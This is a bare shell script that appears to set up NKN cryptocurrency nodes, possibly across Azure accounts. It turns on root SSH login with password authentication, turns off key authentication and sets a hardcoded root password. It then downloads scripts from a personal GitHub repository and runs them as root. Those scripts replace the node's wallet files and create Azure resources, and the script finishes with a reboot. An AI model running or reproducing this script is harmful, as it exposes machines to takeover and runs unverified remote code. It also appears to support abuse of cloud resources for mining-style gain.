#!/bin/sh
sudo su
cat >>/etc/ssh/sshd_config <<EOF
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication no
EOF
sudo echo 'root:Ytb1452@!@#$%Aa' | chpasswd
sudo apt-get update && sudo curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash && sudo wget -O /home/Azu.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/Azu.sh' && sudo wget -O install.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/nkndinstall.sh'; sudo bash install.sh && sudo systemctl stop nkn-commercial.service && rm -rf /home/nknag/nkn-commercial/services/nkn-node/wallet.json && rm -rf /home/nknag/nkn-commercial/services/nkn-node/wallet.pswd && sudo wget -O wallet.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/wallet.sh'; sudo bash wallet.sh && sudo systemctl daemon-reload && systemctl start nkn-commercial.service && sudo wget -O /home/Azu_creat_full_cli.sh 'https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/Azu_creat_full_cli.sh'; sudo bash Azu_creat_full_cli.sh && sudo reboot
